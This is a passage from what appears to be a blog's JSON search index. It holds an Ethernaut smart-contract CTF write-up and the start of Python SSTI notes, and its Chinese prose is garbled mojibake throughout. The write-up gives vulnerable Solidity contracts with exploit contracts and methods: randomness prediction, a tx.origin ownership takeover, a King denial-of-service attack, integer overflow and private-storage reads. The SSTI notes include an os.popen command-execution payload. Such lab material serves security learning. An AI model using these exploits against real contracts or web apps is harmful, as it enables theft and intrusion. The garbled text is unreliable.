main()","link":"/2022/10/12/HNctf/"},{"title":"Ethernautåˆ·é¢˜è®°å½•","text":"è¸©å‘è®°å½•æ¥è‡ªè¿™é‡Œ å¯è§ä¿®é¥°ç¬¦publicprivateethernaut0.æ³¨æ„äº‹é¡¹ @openzeppelin/contracts/math/SafeMath.sol çš„åœ°å€å·²ç»è¿ç§»ï¼Œåšè¿™ä¸ªé¶åœºçš„æ—¶å€™å¾—è‡ªå·±æ‰‹åŠ¨æ”¹æˆ&quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;; ä»¥å¤ªåŠä¸»ç½‘å³å°†è¿›è¡Œåˆå¹¶ï¼ŒRinkebyæµ‹è¯•ç½‘ç»œå°†äºä¸€å¹´ååœæ­¢è¿è¡Œï¼Œåˆ°æ—¶å€™å°±ä¸çŸ¥é“è¿™ä¸ªé¶åœºæ˜¯å¦è¿˜ä¼šç»§ç»­è¿è¡Œ ä¸åŒç‰ˆæœ¬çš„solidityè¯­è¨€ç‰¹æ€§ä¸ä¸€æ ·ï¼Œå¯èƒ½ä¼šæœ‰å…¼å®¹é—®é¢˜ Rinkebyçš„æµ‹è¯•ä»¥å¤ªéš¾ä»¥å¤§é‡è·å–ï¼Œåšé¢˜ä¸è¦ä¸€è‚¡è„‘æŠŠä»¥å¤ªå…¨å¡è¿›å»äº† 1.Falloutæè¿°12345678910111213è¿™å¾ˆç™½ç—´æ˜¯å§? çœŸå®ä¸–ç•Œçš„åˆçº¦å¿…é¡»å®‰å…¨çš„å¤š, éš¾ä»¥å…¥ä¾µçš„å¤š, å¯¹å§?å®é™…ä¸Š... ä¹Ÿæœªå¿….Rubixiçš„æ•…äº‹åœ¨ä»¥å¤ªåŠç”Ÿæ€ä¸­éå¸¸çŸ¥å. è¿™ä¸ªå…¬å¸æŠŠåå­—ä» 'Dynamic Pyramid' æ”¹æˆ 'Rubixi' ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåœ°, ä»–ä»¬æ²¡æœ‰æŠŠåˆçº¦çš„ constructor æ–¹æ³•ä¹Ÿä¸€èµ·æ›´å:contract Rubixi { address private owner; function DynamicPyramid() { owner = msg.sender; } function collectAllFees() { owner.transfer(this.balance) } ...è¿™è®©æ”»å‡»è€…å¯ä»¥è°ƒç”¨æ—§åˆçº¦çš„constructor ç„¶åè·å¾—åˆçº¦çš„æ§åˆ¶æƒ, ç„¶åå†è·å¾—ä¸€äº›èµ„äº§. æ˜¯çš„. è¿™äº›é‡å¤§é”™è¯¯åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œæ˜¯æœ‰å¯èƒ½çš„. åˆçº¦ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; }} è§£:æ‰”åˆ°remixé‡Œé¢è°ƒç”¨Fal1out()å‡½æ•°å°±è¡Œäº† 2.Coin Flipæè¿°è¿™æ˜¯ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿ç»­çš„çŒœå¯¹ç»“æœã€‚å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿ç»­çŒœå¯¹åæ¬¡ã€‚ åˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } }} è§£:ä»¥å¤ªåŠç½‘ç»œç»å…¸éš¾é¢˜:ç†µçš„äº§ç”Ÿ ä½¿ç”¨åŒºå—å“ˆå¸Œäº§ç”Ÿçš„éšæœºæ•°å¾ˆå®¹æ˜“è¢«é¢„æµ‹(åªéœ€è¦å’Œå®ƒåœ¨åŒä¸€ä¸ªåŒºå—ä¸Šå°±è¡Œäº†)ï¼Œåªéœ€è¦å†™ä¸ªä¸­ç»§åˆçº¦æ‰“è¿›å»å°±è¡Œäº†ï¼ˆåŸæ¥çš„åˆçº¦åŸºç¡€ä¹‹ä¸Šæ”¹ä¸€ç‚¹ç‚¹å°±è¡Œäº†ï¼‰ 1234567891011121314function exp() public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; c = CoinFlip(targetAddress); c.flip(side);} æ³¨æ„ï¼šåœ¨æŸäº›é¢„æµ‹éšæœºæ•°çš„é¢˜ç›®ä¸­ä¼šè¿”è¿˜ä»¥å¤ªï¼Œç»å¸¸å‡ºç°åˆçº¦é€»è¾‘æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯å°±æ˜¯è¿è¡Œå‡ºé”™çš„é—®é¢˜ã€‚ å½“åˆçº¦æ”¶åˆ°ä¸€ä¸ªcalldataä¸ºç©ºçš„callæ—¶ï¼Œreceiveå‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚è¿™ä¸ªå‡½æ•°ä¼šåœ¨æ‰§è¡Œä¸€äº›ä»¥å¤ªå¸è½¬è´¦æ“ä½œæ—¶è¢«æ‰§è¡Œï¼Œå¸¸è§çš„ä»¥å¤ªå¸è½¬è´¦æ“ä½œåŒ…æ‹¬.send()ã€.transfer()å‡½æ•°å‘èµ·çš„è½¬è´¦ã€‚å¦‚æœæ²¡æœ‰receiveå‡½æ•°å­˜åœ¨ï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªpayableå±æ€§çš„fallbackå‡½æ•°çš„è¯ï¼Œè¿™ä¸ªfallbackå‡½æ•°ä¼šåœ¨ä¸€æ¬¡ä»¥å¤ªå¸è½¬è´¦ä¸­è¢«è°ƒç”¨ã€‚å¦‚æœä¸€ä¸ªåˆçº¦æ—¢æ²¡æœ‰receiveå‡½æ•°ä¹Ÿæ²¡æœ‰payableå±æ€§çš„fallbackå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªåˆçº¦ä¸èƒ½é€šè¿‡å¸¸è§„çš„äº¤æ˜“æ¥æ¥æ”¶ä»¥å¤ªå¸ï¼Œå¹¶ä¸”ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚ 3.Telephoneåˆçº¦ä»£ç 12345678910111213141516pragma solidity ^0.6.0;contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } }} è§£:tx.orginæŒ‡çš„æ˜¯äº¤æ˜“çš„å‘èµ·æ–¹ï¼Œmsg.senderæ˜¯ç›´æ¥è°ƒç”¨çš„ä¸€æ–¹ï¼Œæ‰€ä»¥ç›´æ¥å†™åˆçº¦è°ƒç”¨è¿™ä¸ªå‡½æ•°å°±è¡Œäº† 123456789101112131415161718192021pragma solidity ^0.4.11;interface Telephone { function changeOwner(address _owner) external;}contract exploit { address targetAddr; Telephone t; address myaddr; function setInstance(address _targetAddr,address _myaddr) public { targetAddr=_targetAddr; myaddr= _myaddr; } function exp () public { t = Telephone(targetAddr); t.changeOwner(myaddr); }} 4.Tokenåˆçº¦ä»£ç 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token { mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }} è§£:å¾ˆeasy æº¢å‡ºå°±å®Œäº‹äº†è½¬ä¸ª 115792089237316195423570985008687907853269984665640564039457584007913129639935å°±è¡Œäº† 5. Delegationåˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; }}contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } }} è§£ï¼šè€ç”Ÿå¸¸è°ˆï¼Œ delegatecallç›¸å½“äºæ˜¯å»ç›®æ ‡åˆçº¦é‚£å—æŠŠç›¸å…³çš„å‡½æ•°ä»£ç å¤åˆ¶è¿‡æ¥è¿è¡Œï¼Œè€Œåœ¨solidityæ˜¯ä¸ªç¼–è¯‘å‹è¯­è¨€ï¼Œä¸”å­˜å‚¨ä½¿ç”¨çš„æ˜¯slot[]è¿™ä¸ªå¤§æ•°ç»„ï¼Œå˜é‡æ˜¯å†™æ­»åœ¨ä»£ç é‡Œé¢çš„ï¼Œä¸€æ—¦ç›®æ ‡åˆçº¦çš„å˜é‡ç¯å¢ƒå’Œå½“å‰åˆçº¦çš„å˜é‡ç¯å¢ƒä¸ä¸€æ ·ï¼Œå°±å‡ºå¤§äº‹ï¼Œè¿™é¢˜éƒ½åšçƒ‚äº†ï¼Œæ‡’å¾—å†™äº† 6.Forceæè¿°123æœ‰äº›åˆçº¦å°±æ˜¯æ‹’ç»ä½ çš„ä»˜æ¬¾,å°±æ˜¯è¿™ä¹ˆä»»æ€§ Â¯\\_(ãƒ„)_/Â¯è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äº0 åˆçº¦ä»£ç 123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =Ã¸= / (______)__m_m)*/} è§£ï¼šåœ¨Solidityé‡Œé¢ï¼Œæœ‰ä¸ªå¾ˆç‰¹æ®Šçš„è‡ªæ¯å‡½æ•° selfdestruct(addr);éšä¾¿å†™ä¸ªåˆçº¦ï¼Œå¡è¿›å»ä¸€ä¸ªselfdestructå‡½æ•°ï¼Œç„¶åæŒ‡å‘é¢˜ç›® 7.Vaultåˆçº¦ä»£ç 123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } }} è§£ç›´æ¥getStorageAtå°±è¡Œäº†ï¼Œç›´æ¥çœ‹ 8.Kingåˆçº¦ä»£ç 12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; }} è§£ï¼š1234567891011contract Attack { constructor(address payable target) public payable{ require(msg.value == 0.15 ether,&quot;Not enough!&quot;); target.call.gas(1000000).value(0.15 ether)(&quot;&quot;); } receive() external payable { revert(); }} å½“submité¢˜ç›®æ‰“ç®—å›æ”¶â€œç‹æƒâ€æ—¶ï¼Œå®ƒè¿è¡Œåˆ°king.transfer(msg.value);è¿™ä¸€è¡Œæ—¶ï¼Œç”±äºkingå°±æ˜¯æˆ‘ä»¬åˆçº¦çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬åˆçº¦çš„receiveå‡½æ•°ä¼šæ‰§è¡Œrevertï¼Œå› æ­¤å®ƒä¼šå¡åœ¨è¿™ä¸ªçŠ¶æ€æ— æ³•æ‰§è¡Œï¼Œä»è€Œæ— æ³•å–å›ç‹æƒã€‚ è¿™ä¸ªæ¼æ´åœ¨å®é™…åˆçº¦ä¸­è¢«ç”¨revertæ¥æ‰§è¡ŒDDosï¼Œè®©ç¨‹åºå¡åœ¨æŸä¸ªçŠ¶æ€æ— æ³•è¿è¡Œã€‚ éº»äº†ï¼Œåœ¨å†™æ”»å‡»åˆçº¦çš„æ—¶å€™åˆè¸©å‘é‡Œäº†https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/ transfer:è¦æ±‚æ¥æ”¶çš„æ™ºèƒ½åˆçº¦ä¸­å¿…é¡»æœ‰ä¸€ä¸ªfallbackæˆ–è€…receiveå‡½æ•°ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯(error)ï¼Œå¹¶ä¸”revertï¼ˆä¹Ÿå°±æ˜¯å›æ»šåˆ°äº¤æ˜“å‰çš„çŠ¶æ€ï¼‰ã€‚è€Œä¸”æœ‰å•ç¬”äº¤æ˜“ä¸­çš„æ“ä½œæ€»gasä¸èƒ½è¶…è¿‡2300çš„é™åˆ¶ã€‚transferå‡½æ•°ä¼šåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µæŠ›å‡ºé”™è¯¯ï¼š ä»˜æ¬¾æ–¹åˆçº¦çš„ä½™é¢ä¸è¶³ï¼Œå°äºæ‰€è¦å‘é€çš„value æ¥æ”¶æ–¹åˆçº¦æ‹’ç»æ¥æ”¶æ”¯ä»˜ send:å’Œtransferå‡½æ•°çš„å·¥ä½œæ–¹å¼åŸºæœ¬ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºï¼Œå½“å‡ºç°ä¸Šè¿°ä¸¤ç§äº¤æ˜“å¤±è´¥çš„æƒ…å†µæ—¶ï¼Œsendçš„è¿”å›ç»“æœæ˜¯ä¸€ä¸ªbooleanå€¼ï¼Œè€Œä¸ä¼šæ‰§è¡Œrevertå›æ»šã€‚ call: callå‡½æ•°å’Œä¸Šé¢æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼Œå®ƒæ²¡æœ‰gasçš„é™åˆ¶ï¼Œä½¿ç”¨callæ—¶EVMå°†æ‰€æœ‰gasè½¬ç§»åˆ°æ¥æ”¶åˆçº¦ä¸Šï¼Œå½¢å¼å¦‚ä¸‹: (bool success, bytes memory data) = receivingAddress.call{value: 100}(â€œâ€); å°†å‚æ•°è®¾ç½®ä¸ºç©ºä¼šè§¦å‘æ¥æ”¶åˆçº¦çš„fallbackå‡½æ•°ï¼Œä½¿ç”¨callåŒæ ·ä¹Ÿå¯ä»¥è°ƒç”¨æœ¬åˆçº¦å†…çš„å‡½æ•°ï¼Œå½¢å¼å¦‚ä¸‹ (bool sent, bytes memory data) = _to.call{gas :10000, value: msg.value}(byte4(keccack256(â€œfunction_name(uint256)â€,args))); 9.Re-entrancyåˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Reentrance { using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;); if(result) { _amount; } balances[msg.sender] -= _amount; } } receive() external payable {}} è§£åˆçº¦åœ¨è¿›è¡Œæå¸æ—¶ï¼Œä½¿ç”¨ require ä¾æ¬¡åˆ¤æ–­æå¸è´¦æˆ·æ˜¯å¦æ‹¥æœ‰ç›¸åº”çš„èµ„äº§ï¼Œéšåä½¿ç”¨ msg.sender.call.value(amount)() æ¥å‘é€ Etherï¼Œå¤„ç†å®Œæˆåç›¸åº”ä¿®æ”¹ç”¨æˆ·èµ„äº§æ•°æ®ã€‚ é¦–å…ˆï¼Œä½¿ç”¨callè¿›è¡Œè½¬è´¦æ˜¯ä¸ªæ¯”è¾ƒå±é™©çš„æ“ä½œï¼Œå› ä¸ºcallä¼šå°†å½“å‰å‰©ä¸‹çš„gasä¸€å¹¶å‘è¿‡å»ï¼Œè¿™å°±å¯¼è‡´ç›®æ ‡åˆçº¦åœ¨å‘é€ä»¥å¤ªè¿‡å»åä¼šæœ‰è¶³å¤Ÿçš„gasè¿è¡Œæ”»å‡»åˆçº¦é‡Œçš„receiveå‡½æ•°ï¼Œè€Œæ”»å‡»åˆçº¦é‡Œçš„receiveåˆä¼šå»è°ƒç”¨ç›®æ ‡åˆçº¦é‡Œçš„è½¬è´¦å‡½æ•°ï¼Œæ­¤æ—¶ç›®æ ‡åˆçº¦é‡Œè®°å½•è½¬è´¦çš„å˜é‡è¿˜æœªè¢«ä¿®æ”¹ï¼Œå› æ­¤åˆå¯ä»¥ç»§ç»­è½¬è´¦ç„¶åå¦‚æ­¤å¾€å¤ã€‚ 10.Elevatoråˆçº¦ä»£ç 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Building { function isLastFloor(uint) external returns (bool);}contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } }} ç›®æ ‡æ˜¯è®©topå˜ä¸ºtrueï¼Œåªéœ€è¦è¿”å›ä¸åŒç»“æœå°±å¯ä»¥äº† ç»§æ‰¿æŠ½è±¡åˆçº¦ï¼Œç„¶åå†™å‡½æ•°å°±å®Œäº‹äº†ã€‚ 11.Privacyå¾ˆç®€å•çš„é¢˜ç›®ï¼Œæƒ³åœ¨åŒºå—é“¾ä¸Šä¿æŠ¤è‡ªå·±çš„éšç§ï¼Œå¤ªç¦»è°±äº†ã€‚ 12345678910111213141516171819202122232425262728293031// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */} è§£ï¼šæ ¹æ®slotæ’æ§½ï¼Œç¡®å®šæ•°æ®åœ¨å“ªé‡Œ 123456slot[0] | (bool locked)|slot[1] |(uint256 ID )|slot[2] | (unit 16 awkwardness)(uint8 denomination)(unit8 flattening)|slot[3] |(bytes32[0] )|slot[4] |(bytes32[1] )|slot[5] |(bytes32[2] )| åˆçº¦ä¸­è¦æ±‚require(_key == bytes16(data[2])); åªéœ€è¦web3.eth.getStroageAt(contract.address,5)ç„¶åæˆªå–ç»“æœçš„å‰32ä½å‘è¿‡å»å°±è¡Œäº† 12. Gatekeeper One1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract GatekeeperOne { using SafeMath for uint256; address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { require(gasleft().mod(8191) == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; }} è§£:gateOne()è¿™ä¸ªå¥½è¿‡ï¼Œå†™ä¸ªåˆçº¦å°±è¡Œäº† gateTwo()è¿™ä¸ªä¹Ÿå¥½è¿‡â€¦.?åº”è¯¥ï¼Ÿï¼Œä¸­ç»§åˆçº¦é‡Œé¢.callé™åˆ¶ä¸€ä¸‹æ•°å­—ï¼Ÿ 13.Privacy123456789101112131415161718192021222324252627282930313233343536373839// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(now &gt; timeLock); _; } else { _; } } } è§£:ä½ å†™ä½ çš„ï¼Œæˆ‘ç”¨æˆ‘çš„ ERC20æœ‰è‡ªå·±çš„è½¬è´¦å‡½æ•°ï¼Œå’±ä¸ºå•¥ç”¨ä»–çš„è½¬è´¦å‡½æ•°å‘¢? 16.delegateè¿‡ 17. Recovery","link":"/2022/10/04/solidity/"},{"title":"SSTIå­¦ä¹ ","text":"é¦–å…ˆæ˜¯è¿™å¹¿ä¸ºäººçŸ¥çš„å›¾ç‰‡,å°±æ”¾åœ¨è¿™é‡Œäº†,å—¯ï¼Œè‚¥è‚ ä¸é”™ 0x01 ä»ç›˜å¤å¼€å¤©è¾Ÿåœ°è®²èµ·â€¦Python ä¸€åˆ‡çš†å¯¹è±¡é¦–å…ˆï¼Œæˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹pythoné‡Œé¢é”™ç»¼å¤æ‚çš„å…³ç³»python objectåŸºç±»_Python ä¸€åˆ‡çš†å¯¹è±¡ objectæ˜¯æœ€é¡¶å±‚åŸºç±»ï¼Œobjectæ˜¯typeçš„å®ä¾‹ï¼Œè€Œtypeåˆç»§æ‰¿objectï¼Œtypeæ˜¯è‡ªèº«çš„å®ä¾‹ã€‚ typeä¹Ÿæ˜¯è‡ªèº«çš„å®ä¾‹åŒ–ï¼Œobjectåˆ›é€ typeï¼Œtypeåˆ›é€ ä¸€åˆ‡å’Œä»–è‡ªå·±ï¼Œæœ‰ç‚¹åƒé“ç”Ÿä¸€ï¼Œä¸€ç”Ÿä¸‰ï¼Œä¸‰ç”Ÿä¸‡ç‰©â€¦..typeè¿è‡ªå·±éƒ½ä¸æ”¾è¿‡ï¼ŒæŠŠè‡ªå·±éƒ½å˜æˆäº†è‡ªå·±çš„å¯¹è±¡ã€‚typeè‡ªå·±å®ä¾‹åŒ–è‡ªå·±ã€‚ objectæ˜¯çˆ¶å­å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰çš„æ•°æ®ç±»å‹çš„çˆ¶ç±»éƒ½æ˜¯å®ƒï¼›typeæ˜¯ç±»å‹å®ä¾‹å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½æ˜¯å®ƒçš„å®ä¾‹çš„ã€‚ 0x02 SSTI åŸç†è¿™æ˜¯å››å¤§å¤©ç‹1234567{% ... %} for Statements {{ ... }} for Expressions to print to the template output {# ... #} for Comments not included in the template output # ... ## for Line Statements {%%} ä¸»è¦ç”¨æ¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥ç”¨äºæ¡ä»¶è¯­å¥å’Œå¾ªç¯è¯­å¥ã€‚ {% set c= 'kawhi' %} {% if 81==9*9 %}kawhi{% endif %} {% for i in ['1','2','3'] %}kawhi{%endfor%} {{}} ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡ºï¼Œæ¯”å¦‚æˆ‘ä»¬ä¸€èˆ¬åœ¨é‡Œé¢è¾“å…¥2-1ï¼Œ2*2ï¼Œæˆ–è€…æ˜¯å­—ç¬¦ä¸²ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéƒ½ä¼šæ¸²æŸ“å‡ºç»“æœ {{2-1}} #è¾“å‡º1 {{2*2}} #è¾“å‡º4 æˆ‘ä»¬é€šå¸¸ä¼šç”¨4ç®€å•æµ‹è¯•é¡µé¢æ˜¯å¦å­˜åœ¨SSTI {##} è¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š ## æœ‰å’Œ{%%}ç›¸åŒçš„æ•ˆæœ è¿™é‡Œçš„æ¨¡æ¿æ³¨å…¥ä¸»è¦ç”¨åˆ°çš„æ˜¯{{}}å’Œ{%%} ç±»çš„çŸ¥è¯†æ€»ç»“12345678910111213141516171819202122232425262728__class__ ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚__base__ ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»__bases__ ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases____mro__ æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚__subclasses__() è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function__globals__ ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚__dic__ ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ__getattribute__() å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚__getitem__() è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a['b']ï¼Œå°±æ˜¯a.__getitem__('b')__builtins__ å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚__import__ åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__('os').popen('ls').read()]__str__() è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚url_for 